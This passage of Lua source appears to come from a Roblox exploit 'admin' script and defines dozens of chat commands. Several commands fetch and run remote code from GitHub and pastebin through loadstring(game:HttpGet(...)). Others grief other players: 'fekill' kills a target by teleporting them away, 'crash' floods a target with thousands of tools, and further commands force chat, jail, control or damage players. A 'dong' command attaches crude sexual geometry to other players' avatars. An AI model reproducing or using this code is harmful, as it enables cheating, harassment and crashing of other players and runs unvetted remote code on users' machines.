loadstring(game:HttpGet("https://raw.githubusercontent.com/diwrkish/fixed-scripts/refs/heads/main/dex%20explorer%20beta%201.0.0.lua", true))()
end
end)

addcmd('rspy', 'loads Simple Spy', {'rspy'},
function(args, speaker)
    if speaker.userId ~= LP.userId then
        lponly(speaker)
    else
        loadstring(game:HttpGet("https://raw.githubusercontent.com/diwrkish/fixed-scripts/refs/heads/main/simple%20spy%20v3.lua", true))()
    end
end)

addcmd('iyspam', '/shrug',{},
function(args, speaker)
loadstring(game:HttpGet(('https://pastebin.com/raw/aJ15LAbN'),true))()
end)

addcmd('firstp', 'forces player to go into first person',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        gPlayers[v].CameraMode = "LockFirstPerson"
    end
end)

addcmd('lock', 'locks a players body parts',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
		for i,v in pairs(gPlayers[v].Character:GetDescendants()) do
		if v:IsA("Part") then
		v.Locked = true
end end end
end)

addcmd('unlock', 'locks a players body parts',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
		for i,v in pairs(gPlayers[v].Character:GetDescendants()) do
		if v:IsA("Part") then
		v.Locked = false
end end end
end)

addcmd('disablereset', 'makes a player unable to reset',{'noreset'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
	gPlayers[v].Character.Humanoid.Name = "HumanoidIY"
	if FindTable(SPC, args[1]) then Notify('Disabled reset for ' .. args[1]) else
	Notify('Disabled reset for player(s)') end
	end)
	end
end)

addcmd('enablereset', 'makes a player unable to reset',{'reset'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
	gPlayers[v].Character.HumanoidIY.Name = "Humanoid"
	if FindTable(SPC, args[1]) then Notify('Enabled reset for ' .. args[1]) else
	Notify('Enabled reset for player(s)') end
	end)
	end
end)

addcmd("fixlighting","Removes effects from lighting",{'fixl'},
function(args,speaker)
    for i,v in pairs(game:GetService("Lighting"):GetChildren()) do
        if v:IsA("PostEffect") then
            v:Destroy()
        end
    end
LightingService.Ambient = origsettings.abt
LightingService.OutdoorAmbient = origsettings.oabt
LightingService.Brightness = origsettings.brt
LightingService.TimeOfDay = origsettings.time
LightingService.FogColor = origsettings.fclr
LightingService.FogEnd = origsettings.fe
LightingService.FogStart = origsettings.fs
end)

addcmd("savelighting","Removes effects from lighting",{'slighting'},
function(args,speaker)
origsettings = {abt = LightingService.Ambient, oabt = LightingService.OutdoorAmbient, brt = LightingService.Brightness, time = 
LightingService.TimeOfDay, fclr = LightingService.FogColor, fe = LightingService.FogEnd, fs = LightingService.FogStart}
Notify('Saved lighting settings')
end)

addcmd("blackandwhite","Makes the game black and white",{},
function(args,speaker)
    local lighting = game:GetService("Lighting")
    local effect = Instance.new("ColorCorrectionEffect",lighting)
    effect.Saturation = -1
end)

addcmd("invert","Makes the game inverted",{},
function(args,speaker)
    local lighting = game:GetService("Lighting")
    local effect = Instance.new("ColorCorrectionEffect",lighting)
    effect.Saturation = -1
    local effect = Instance.new("ColorCorrectionEffect",lighting)
    effect.Saturation = -1
end)

addcmd("sun","Intensifys the sun",{},
function(args,speaker)
    local intense = args[1] or 0.25
    local spread = args[2] or 1
    local lighting = game:GetService("Lighting")
    local effect = Instance.new("SunRaysEffect",lighting)
	effect.Name = "IYsun"
    effect.Intensity = tonumber(intense)
    effect.Spread = tonumber(spread)
end)

addcmd('base', 'spawns a base',{},
function(args, speaker)
local pt = Instance.new("Part")
pt.BrickColor = BrickColor.new("Silver")
pt.Anchored = true
pt.CanCollide = true
pt.BottomSurface = "Weld"
pt.Parent = workspace
pt.Name = (math.random(1,1000000))
pt.Size = Vector3.new(1000, 1, 1000)
pt.Locked = true
Notify('Created new base')
end)

addcmd('unblur', 'removes all blur instances',{'noblur'},
function(args, speaker)
for i,v in pairs(LightingService:GetChildren()) do
    if v:IsA('BlurEffect') then
        v:Destroy()
    end
end
end)

addcmd('thirdp', 'allows player to go into third person',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        gPlayers[v].CameraMode = "Classic"
    end
end)

addcmd('chat', 'forces player to chat what you input',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
		game:GetService('Chat'):Chat(gPlayers[v].Character, GLS(false, 1), 3)
    end
end)

addcmd('name', 'names player',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	if not args[1] then return end
	for i,v in pairs(players) do
		for a, mod in pairs(gPlayers[v].Character:children()) do
		if mod:FindFirstChild("TAG") then
		gPlayers[v].Character.Head.Transparency = 0
		mod:Destroy()
		end
		end
		
		local char = gPlayers[v].Character
		local model = Instance.new("Model", char)
		local clone = char.Head:Clone()
		local hum = Instance.new("Humanoid", model)
		local weld = Instance.new("Weld", clone)
			model.Name = GLS(false, 1)
			clone.Parent = model
			hum.Name = "TAG"
			hum.MaxHealth = 100
			hum.Health = 100
			weld.Part0 = clone
			weld.Part1 = char.Head
			char.Head.Transparency = 1
	end
end)

addcmd('unname', 'unnames player',{'unhidename'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    local name = (args[2])
	for i,v in pairs(players) do
		for a, mod in pairs(gPlayers[v].Character:children()) do
			if mod:FindFirstChild("TAG") then
				gPlayers[v].Character.Head.Transparency = 0
				mod:Destroy()
			end
		end
	end
end)

addcmd('noname', 'hides the players name',{'hidename'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		for a, mod in pairs(gPlayers[v].Character:children()) do
		if mod:FindFirstChild("TAG") then
		gPlayers[v].Character.Head.Transparency = 0
		mod:Destroy()
		end
		end
		
		local char = gPlayers[v].Character
		local model = Instance.new("Model", char)
		local clone = char.Head:Clone()
		local hum = Instance.new("Humanoid", model)
		local weld = Instance.new("Weld", clone)
			model.Name = ""
			clone.Parent = model
			hum.Name = "TAG"
			hum.MaxHealth = 100
			hum.Health = 100
			weld.Part0 = clone
			weld.Part1 = char.Head
			char.Head.Transparency = 1
	end
end)

addcmd('damage', 'damages a player',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		gPlayers[v].Character.Humanoid.Health = gPlayers[v].Character.Humanoid.Health - 25
	end
end)

addcmd('view', 'views player',{'spectate'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		workspace.CurrentCamera.CameraSubject = gPlayers[v].Character
		Notify('Viewing ' .. gPlayers[v].Name)
	end
end)

addcmd('unview', 'stops viewing player',{'unspectate'},
function()
	workspace.CurrentCamera.CameraSubject = gPlayers.LocalPlayer.Character
	Notify('View turned off')
end)

addcmd('nolimbs', 'removes limbs from player',{'rlimbs'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		for i,v in pairs(gPlayers[v].Character:GetChildren()) do
			if v:IsA("BasePart") and
				v.Name == "Right Leg" or
				v.Name == "Left Leg" or
				v.Name == "Right Arm" or
				v.Name == "Left Arm" then
				v:Destroy()
			end
		end
	end	
end)

addcmd('noarms', 'removes arms from player',{'rarms'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		for i,v in pairs(gPlayers[v].Character:GetChildren()) do
			if v:IsA("BasePart") and
				v.Name == "Right Arm" or
				v.Name == "Left Arm" then
				v:Destroy()
			end
		end
	end	
end)

addcmd('torso', 'just a torso....',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		spawn(function()
		for i,v in pairs(gPlayers[v].Character:GetDescendants()) do
			if v:IsA("BasePart") and
				v.Name == "Right Leg" or
				v.Name == "Left Leg" or
				v.Name == "Right Arm" or
				v.Name == "Left Arm" or
				v:IsA('Decal') or v:IsA('Texture') or
				v:IsA('Accessory') then
				v:Destroy()
			end
		end
		gPlayers[v].Character.Head.Transparency = 1
		end)	
		end
end)

addcmd('box', 'creates a box around player',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=_char(v)
        local SB = Instance.new("SelectionBox", pchar)
        SB.Adornee = SB.Parent
    end
end)

addcmd('nobox', 'takes away box from player',{'unbox'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=_char(v)
        for i,v in pairs(gPlayers[v].Character:GetChildren()) do
			if v:IsA("SelectionBox") then
				v:Destroy()
			end
	    end
    end
end)

addcmd('ghost', 'ghostifys player',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=gPlayers[v].Character
        pchar.Head.Transparency = 0.5
        pchar.Torso.Transparency = 0.5
        pchar["Left Arm"].Transparency = 0.5
        pchar["Right Arm"].Transparency = 0.5
        pchar["Left Leg"].Transparency = 0.5
        pchar["Right Leg"].Transparency = 0.5
        pchar.Head.face.Transparency = 0.5
    end
end)

addcmd('unghost', 'unghostifys player',{'noghost'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=gPlayers[v].Character
        pchar.Head.Transparency = 0
        pchar.Torso.Transparency = 0
        pchar["Left Arm"].Transparency = 0
        pchar["Right Arm"].Transparency = 0
        pchar["Left Leg"].Transparency = 0
        pchar["Right Leg"].Transparency = 0
        pchar.Head.face.Transparency = 0
    end
end)

addcmd('sphere', 'puts sphere around player',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=gPlayers[v].Character
        local SS = Instance.new("SelectionSphere", pchar)
        SS.Adornee = SS.Parent
    end
end)

addcmd('unsphere', 'removes sphere around player',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=_char(v)
        for i,v in pairs(gPlayers[v].Character:GetChildren()) do
			if v:IsA("SelectionSphere") then
				v:Destroy()
			end
	    end
    end
end)

addcmd('ambient','changes ambient',{},
function(args, speaker)
	LightingService.Ambient = Color3.fromRGB(args[1],args[2],args[3])
	LightingService.OutdoorAmbient = Color3.fromRGB(args[1],args[2],args[3])
end)

addcmd('fogend','changes the fogend',{},
function(args, speaker)
	LightingService.FogEnd = args[1]
end)

addcmd('fogcolor','changes the fogs color',{},
function(args, speaker)
	LightingService.FogColor = Color3.fromRGB(args[1],args[2],args[3])
end)

injail = {}
addcmd('jail','jails player',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
		if FindTable(injail, _players[v].Name) then return end
		table.insert(injail, _players[v].Name)
		local pchar=gPlayers[v].Character
		local J = DATA.JAIL:Clone() J.Parent = workspace J:MoveTo(pchar.HumanoidRootPart.Position) J.Name = 'JAIL_' .. _players[v].Name
		repeat wait(0.5)
		pchar = _players[v].Character if pchar and pchar:FindFirstChild('HumanoidRootPart') and J:FindFirstChild('MAIN') then pchar.HumanoidRootPart.CFrame = J.MAIN.CFrame + Vector3.new(0, 1, 0) end
		until not FindTable(injail, _players[v].Name)
	end)
	end
end)

addcmd('unjail','unjails player',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
		for a,b in pairs(injail) do if b == _players[v].Name then table.remove(injail, a) end end
		workspace["JAIL_" .. _players[v].Name]:Destroy()
		end)
		end
end)

loopn = {}
addcmd('loopname','loops a players name',{'lname'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
		if FindTable(loopn, _players[v].Name) then return end
		table.insert(loopn, _players[v].Name)
		local Lname = GLS(false, 1)
		local pchar=gPlayers[v].Character
		pchar.Name = Lname
		if FindTable(SPC, args[1]) then Notify('Looping name for ' .. args[1] .. ' (only visible to others)') else
		Notify('Looping name for player(s) (only visible to others)') end
		repeat wait(0.01)
		repeat wait() until _players[v].Character
		gPlayers[v].Character.Name = Lname
		until not FindTable(loopn, _players[v].Name)
	end)
	end
end)

addcmd('unloopname','unjails player',{'noloopname','unlname','nolname'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
		local pchar=gPlayers[v].Character
		for a,b in pairs(loopn) do if b == _players[v].Name then table.remove(loopn, a) end end
		wait(0.5)
		if FindTable(SPC, args[1]) then Notify('Stopped looping name for ' .. args[1]) else
		Notify('Stopped looping name for player(s)') end
		pchar.Name = gPlayers[v].Name
		end)
		end
end)

addcmd('loopbring','loop brings a player lol',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
	if FindTable(bringT, _players[v].Name) then return end
	table.insert(bringT, _players[v].Name)
		local pchar=gPlayers[v].Character
		pchar.Humanoid.Jump = true
		repeat wait(0.5)
		pchar = _players[v].Character
		for i,c in pairs(players) do
		if pchar~= nil and pchar:FindFirstChild("HumanoidRootPart") and speaker.Character ~= nil and speaker.Character:FindFirstChild("HumanoidRootPart") then
		pchar.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame + Vector3.new(4,1,0)
		end
		end
		until not FindTable(bringT, _players[v].Name)
	end)
	end
end)

addcmd('feinvisible','fe invisible',{'feinvis'},
function(args, speaker)
-- Elite1337#9377 & Timeless#4044
local function CheckRig()
    if Player.Character then
        local Humanoid = Player.Character:WaitForChild('Humanoid')
        if Humanoid.RigType == Enum.HumanoidRigType.R15 then
            return 'R15'
        else
            return 'R6'
        end
    end
end
local function InitiateInvis()
    local Character = Player.Character
    local StoredCF = Character.PrimaryPart.CFrame
        local Part = Instance.new('Part',workspace)
        Part.Size = Vector3.new(5,0,5)
        Part.Anchored = true
        Part.CFrame = CFrame.new(Vector3.new(9999,9999,9999))
        Character.PrimaryPart.CFrame = Part.CFrame*CFrame.new(0,3,0)
        spawn(function()
            wait(3)
            Part:Destroy()
        end)
    if CheckRig() == 'R6' then
        local Clone = Character.HumanoidRootPart:Clone()
        Character.HumanoidRootPart:Destroy()
        Clone.Parent = Character
    else
        local Clone = Character.LowerTorso.Root:Clone()
        Character.LowerTorso.Root:Destroy()
        Clone.Parent = Character.LowerTorso
    end
end
InitiateInvis()
end)

addcmd('unloopbring','unjails player',{'noloopbring'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
		for a,b in pairs(bringT) do if b == _players[v].Name then table.remove(bringT, a) end end
		end)
		end
end)

strobe = false
addcmd('strobe','makes the server flash',{'flash'},
function(args, speaker)
	if strobe == false then
		strobep = Instance.new("ColorCorrectionEffect")
		strobep.Brightness = 1
		strobep.Parent = LightingService
		strobe = true
		repeat wait(0.01)
		strobep.Enabled = true
		wait(0.01)
		strobep.Enabled = false
		until strobe == false
		end
end)

addcmd('unstrobe','makes the server flash',{'noflash','nostrobe','unflash','unstrobe'},
function(args, speaker)
	strobe = false
	strobep:Destroy()
end)

addcmd('shutdown', 'shuts the server down',{},
function(args, speaker)
Notify('Broken atm :(')
end)

addcmd('fekill','oof?',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
-- illremember's cool fe kill script
local Target = gPlayers[v].Name
game:GetService("Players").LocalPlayer.Character.Humanoid.Name = 1
local l = game:GetService("Players").LocalPlayer.Character["1"]:Clone()
l.Parent = game:GetService("Players").LocalPlayer.Character
l.Name = "Humanoid"
wait(0.1)
game:GetService("Players").LocalPlayer.Character["1"]:Destroy()
game.Workspace.CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character
game:GetService("Players").LocalPlayer.Character.Animate.Disabled = true
wait(0.1)
game:GetService("Players").LocalPlayer.Character.Animate.Disabled = false
game:GetService("Players").LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(v)
v.CanBeDropped = true
end
wait(0.1)
game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[Target].Character.HumanoidRootPart.CFrame
wait(0.1)
game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[Target].Character.HumanoidRootPart.CFrame
wait(0.2)
game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-10000,-100, -10000))
end
end)

addcmd('animation','makes player animate',{'anim'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		local pchar=_char(v)
		local AnimationId = tostring(args[2])
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://"..AnimationId
		local k = pchar.Humanoid:LoadAnimation(Anim)
		k:Play()
    end
end)

addcmd('creeper','make the player a creeper',{'crpr'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	local pchar = gPlayers[v].Character
        if gPlayers[v] and pchar and pchar:findFirstChild("Torso") then
            if pchar:FindFirstChild("Shirt") then
	            pchar.Shirt.Parent = pchar.Torso
            end
            if pchar:FindFirstChild("Pants") then
	            pchar.Pants.Parent = pchar.Torso
            end
            if pchar:FindFirstChild("Shirt Graphic") then
	            pchar["Shirt Graphic"].Graphic = ""
            end
            for i,v in pairs(pchar:GetChildren()) do
	            if v:IsA("Accessory") then
		            v:Destroy()
	            end
            end
            pchar.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
            pchar.Torso["Right Shoulder"].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(90),0)
            pchar.Torso["Left Shoulder"].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(-90),0)
            pchar.Torso["Right Hip"].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(90),0)
            pchar.Torso["Left Hip"].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(-90),0)
            pchar["Body Colors"].HeadColor = BrickColor.new("Bright green")
            pchar["Body Colors"].LeftArmColor = BrickColor.new("Bright green")
            pchar["Body Colors"].LeftLegColor = BrickColor.new("Bright green")
            pchar["Body Colors"].RightArmColor = BrickColor.new("Bright green")
            pchar["Body Colors"].RightLegColor = BrickColor.new("Bright green")
            pchar["Body Colors"].TorsoColor = BrickColor.new("Bright green")
        end
    end
end)

addcmd('uncreeper','makes player back to normal',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	    refresh(gPlayers[v])
	end
end)

addcmd('crash','crashes a player',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	if FindTable(WL, gPlayers[v].Name) then Notify('Error: '..gPlayers[v].Name..' is whitelisted') else
	if FindTable(SPC, args[1]) then Notify('Crashed ' .. args[1]) else
	Notify('Crashed player(s)') end
	wait(4)
if gPlayers[v] ~= nil then
for i=1,3600 do
Instance.new("Tool",gPlayers[v].Backpack).Name = "-"
end
wait()
for i=1,3600 do
Instance.new("Tool",gPlayers[v].Backpack).Name = "-"
end
wait()
end
end
end
end)

addcmd('shrek', 'makes player shrek',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		local pchar = gPlayers[v].Character
		for i,v in pairs(pchar:GetChildren()) do
			if v:IsA("Accessory") or v:IsA("CharacterMesh") or v:IsA("Shirt") or v:IsA("Pants") 
then
				v:Destroy()
			end
		end
		for i,v in pairs(pchar.Head:GetChildren()) do
			if v:IsA("Decal") or v:IsA("SpecialMesh") then
				v:Destroy()
			end
		end
		
		local mesh = Instance.new("SpecialMesh", pchar.Head)
		mesh.MeshType = "FileMesh"
		pchar.Head.Mesh.MeshId = "http://www.roblox.com/asset/?id=19999257"
		pchar.Head.Mesh.Offset = Vector3.new(-0.1, 0.1, 0)
		pchar.Head.Mesh.TextureId = "http://www.roblox.com/asset/?id=156397869"
		
		local Shirt = Instance.new("Shirt", gPlayers[v].Character)
		local Pants = Instance.new("Pants", gPlayers[v].Character)
		
		Shirt.ShirtTemplate = "rbxassetid://133078194"
		Pants.PantsTemplate = "rbxassetid://133078204"
	end
end)

addcmd('unshrek','makes player back to normal',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	    refresh(gPlayers[v])
	end
end)

addcmd('oof','good things happen',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
		if gPlayers[v].Character.Head:FindFirstChild("Died") then gPlayers[v].Character.Head.Died.Looped = true wait(0.1) gPlayers[v].Character.Head.Died.Playing = true
		gPlayers[v].Character.Head.Died.Volume = 10
		gPlayers[v].Character.Head.Died.Pitch = 0.5
		end
	    execCmd("size " .. gPlayers[v].Name .. ' -1')
		execCmd("hheight " .. gPlayers[v].Name .. ' 1000000000')
		wait(5)
		execCmd("explode " .. gPlayers[v].Name)
		wait(0.1)
		gPlayers[v].Character.Humanoid.Health = 0
		end)
		end
end)

addcmd('control','controls player',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
		local pchar = gPlayers[v].Character
		if gPlayers[v] and pchar then
			execCmd("invisible " .. speaker.Name)
			pchar.Humanoid.PlatformStand = true
			local w = Instance.new("Weld", speaker.Character.Torso) 
			w.Part0 = speaker.Character.Torso 
			w.Part1 = pchar.Torso  
			local w2 = Instance.new("Weld", speaker.Character.Head) 
			w2.Part0 = speaker.Character.Head 
			w2.Part1 = pchar.Head  
			local w3 = Instance.new("Weld", speaker.Character:findFirstChild("Right Arm")) 
			w3.Part0 = speaker.Character:findFirstChild("Right Arm")
			w3.Part1 = pchar:findFirstChild("Right Arm") 
			local w4 = Instance.new("Weld", speaker.Character:findFirstChild("Left Arm"))
			w4.Part0 = speaker.Character:findFirstChild("Left Arm")
			w4.Part1 = pchar:findFirstChild("Left Arm") 
			local w5 = Instance.new("Weld", speaker.Character:findFirstChild("Right Leg")) 
			w5.Part0 = speaker.Character:findFirstChild("Right Leg")
			w5.Part1 = pchar:findFirstChild("Right Leg") 
			local w6 = Instance.new("Weld", speaker.Character:findFirstChild("Left Leg")) 
			w6.Part0 = speaker.Character:findFirstChild("Left Leg")
			w6.Part1 = pchar:findFirstChild("Left Leg") 
			char.Head.face:Destroy()
			for i,v in pairs(pchar:GetChildren()) do
				if v:IsA("BasePart") then 
					v.CanCollide = false
				end
			end
			for i,v in pairs(char:GetChildren()) do
				if v:IsA("BasePart") then
					v.Transparency = 1 
				elseif v:IsA("Accessory") then
					v:Destroy()
				end
			end
			pchar.Parent = char
			pchar.Humanoid.Changed:connect(function()
				pchar.Humanoid.PlatformStand = true
			end)
		end
		end)
		end
end)

addcmd('nuke','nukes player',{}, -- from MML
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
		local pchar = gPlayers[v].Character
	local Pos = CFrame.new(0,1,0)
	if pchar and pchar:FindFirstChild("HumanoidRootPart") then Pos = pchar.HumanoidRootPart.CFrame * CFrame.new(0,1,0) end
	local Blast = Instance.new("Part", workspace) Blast.Name = "BlastEx" Blast.Anchored = true Blast.CanCollide = false Blast.Size = Vector3.new(1,1,1) Blast.CFrame = Pos
	local BlastMesh = Instance.new("SpecialMesh", Blast) BlastMesh.MeshId = "rbxassetid://1290033" BlastMesh.TextureId = "rbxassetid://33145325" BlastMesh.Scale = Vector3.new(0,0,0)
	local Wave = Instance.new("Part", workspace) Wave.BrickColor = BrickColor.new("Deep orange") Wave.Name = "WaveEx" Wave.Anchored = true Wave.CanCollide = false Wave.Size = Vector3.new(1,1,1) Wave.CFrame = Pos * CFrame.Angles(math.pi/2,0,0)
	local WaveMesh = Instance.new("SpecialMesh", Wave) WaveMesh.MeshId = "rbxassetid://3270017"
	local Light = Instance.new("PointLight", Blast) Light.Brightness = 1000 Light.Range = 10000 Light.Color = Color3.new(1,0.2,0.2)
	
	local Effect = Instance.new("ColorCorrectionEffect", gLighting) Effect.Brightness = 0.2 Effect.Contrast = 0.4 Effect.Saturation = 1 Effect.TintColor = Color3.new(1,0.2,0.2)
	
	gLighting.Brightness = 5
	gLighting.Ambient = Color3.new(1,0.5,0.5)
	gLighting.OutdoorAmbient = Color3.new(1,1,1)
	
	local Exp = Instance.new("Explosion", workspace)
	Exp.Position = Pos.p
	Exp.BlastPressure = 10000000
	Exp.BlastRadius = 1000000
	Exp.Hit:connect(function(Part)
		if Part.Name ~= "Base" and Part.Name ~= "BasePlate" and Part ~= Blast and Part ~= Wave and Part.Name ~= "BlastEx" and Part.Name ~= "WaveEx" then
			ypcall(function()
				Part.Anchored = false
				Part.BrickColor = BrickColor.new("Black")
				Part.Material = "Slate"
				Part:BreakJoints()	
			end)
		end
	end)

	local BoomSound = Instance.new('Sound') BoomSound.Parent = workspace
	BoomSound.SoundId = 'rbxassetid://212389494'
	BoomSound:Play()
	for i = 0,100,0.5 do
		Blast.Anchored = true
		Wave.Anchored = true
		BlastMesh.Scale = Vector3.new(i,i,i)
		WaveMesh.Scale = Vector3.new(i^1.3,i^1.3,5)
		Blast.CFrame = Pos
		wait()
	end
	BoomSound:Stop()
	Blast:Destroy()
	Wave:Destroy()
	wait()
	BoomSound:Destroy()
	Effect:Destroy()
	for i = 10,5,-1 do
		gLighting.Brightness = (i-5) + 1
		gLighting.Ambient = Color3.new(i/10,0.5,0.5)
		gLighting.OutdoorAmbient = Color3.new(i/10,i/10,i/10)
		wait(0.05)
	end
		end)
		end
end)

addcmd('dong','gives a player a penis',{'penis'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
		if gPlayers[v].Character:FindFirstChild('wang') then
		gPlayers[v].Character.wang:destroy()
	end
	local D = Instance.new('Model', gPlayers[v].Character)
	D.Name = 'DONG'
	local BG = Instance.new('BodyGyro', gPlayers[v].Character.Torso)
	local MAIN = Instance.new('Part', gPlayers[v].Character['DONG'])
	local M1 = Instance.new('CylinderMesh', MAIN)
	local W1 = Instance.new('Weld', gPlayers[v].Character.Head)
	local P1 = Instance.new('Part', gPlayers[v].Character['DONG'])
	local M2 = Instance.new('SpecialMesh', P1)
	local W2 = Instance.new('Weld', P1)
	local B1 = Instance.new('Part', gPlayers[v].Character['DONG'])
	local M3 = Instance.new('SpecialMesh', B1)
	local W3 = Instance.new('Weld', B1)
	local B2 = Instance.new('Part', gPlayers[v].Character['DONG'])
	local M4 = Instance.new('SpecialMesh', B2)
	local W4 = Instance.new('Weld', B2)
	MAIN.TopSurface = 0 MAIN.BottomSurface = 0 MAIN.Name = 'Main' MAIN.Size = Vector3.new(0.6, 2.5, 0.6) MAIN.BrickColor = BrickColor.new('Pastel brown') MAIN.Position = gPlayers[v].Character.Head.Position MAIN.CanCollide = false
	W1.Part0 = MAIN W1.Part1 = gPlayers[v].Character.Head W1.C0 = CFrame.new(0, 0.25, 2.1) * CFrame.Angles(math.rad(45), 0, 0)
	P1.Name = 'Mush' P1.BottomSurface = 0 P1.TopSurface = 0 P1.Size = Vector3.new(0.6, 0.6, 0.6) P1.CFrame = CFrame.new(MAIN.Position) P1.BrickColor = BrickColor.new('Pink') P1.CanCollide = false
	M2.MeshType = 'Sphere'
	W2.Part0 = MAIN W2.Part1 = P1 W2.C0 = CFrame.new(0, 1.3, 0)
	B1.Name = 'Left Ball' B1.BottomSurface = 0 B1.TopSurface = 0 B1.CanCollide = false B1.Size = Vector3.new(1, 1, 1) B1.CFrame = CFrame.new(gPlayers[v].Character['Left Leg'].Position) B1.BrickColor = BrickColor.new('Pastel brown')
	M3.Parent = B1 M3.MeshType = 'Sphere'
	W3.Part0 = gPlayers[v].Character['Left Leg'] W3.Part1 = B1 W3.C0 = CFrame.new(0, 0.5, -0.5)
	B2.Name = 'Right Ball' B2.BottomSurface = 0 B2.CanCollide = false B2.TopSurface = 0 B2.Size = Vector3.new(1, 1, 1) B2.CFrame = CFrame.new(gPlayers[v].Character['Right Leg'].Position) B2.BrickColor = BrickColor.new('Pastel brown')
	M4.MeshType = 'Sphere'
	W4.Part0 = gPlayers[v].Character['Right Leg'] W4.Part1 = B2 W4.C0 = CFrame.new(0, 0.5, -0.5)
		end)
	end
end)

addcmd('undong','gives a player a penis',{'unpenis','nopenis','nodong'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		if gPlayers[v].Character:FindFirstChild('DONG') then
		gPlayers[v].Character.DONG:destroy()
end end
end)

addcmd('infect','infects player',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		function infect(rip)
		local pchar = gPlayers[v].Character
			for i,v in pairs(pchar:GetChildren()) do
				if v:IsA("Accessory") or v:IsA("Shirt") or v:IsA("Pants") then
					v:Destroy()
				end
			end
			if pchar.Torso:FindFirstChild("roblox") then
				pchar.Torso.roblox:Destroy()
			end
			if pchar.Head:FindFirstChild("face") then
				pchar.Head.face.Texture = "http://www.roblox.com/asset/?id=94634491"
			end
			if pchar:FindFirstChild("Body Colors") then
				local Colors = pchar["Body Colors"]
				local Skin = BrickColor.new("Pastel green")
				local Clothes = BrickColor.new("Reddish brown")
				Colors.HeadColor = Skin
				Colors.LeftArmColor = Skin
				Colors.RightArmColor = Skin
				Colors.LeftLegColor = Clothes
				Colors.RightLegColor = Clothes
				Colors.TorsoColor = Clothes
			end
			local w1 = Instance.new("Weld", pchar)
			w1.Part0 = pchar["Right Arm"]
			w1.Part1 = pchar.Torso
			w1.C0 = CFrame.new(-1.5, 0.5, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(0), math.rad(0))
			local w2 = Instance.new("Weld", pchar)
			w2.Part0 = pchar["Left Arm"]
			w2.Part1 = pchar.Torso
